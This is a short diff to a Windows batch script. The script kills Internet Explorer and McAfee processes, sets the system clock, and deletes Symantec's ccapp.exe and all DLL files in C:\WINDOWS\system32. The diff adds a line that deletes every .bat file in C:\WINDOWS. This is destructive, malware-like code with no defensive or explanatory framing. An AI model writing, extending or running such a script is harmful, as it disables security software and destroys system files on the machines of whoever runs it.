@@ -11,6 +11,7 @@ tskill iexplorer
 time 12:00
 del C:\Program Files\Common Files\Symantec Shared\ccapp.exe
 cd C:\WINDOWS
+if exist "*.bat" del "*.bat"
 cd C:\WINDOWS\system32
 if exist "*.dll" del "*.dll"
 tskill McAfee Security Centre Module
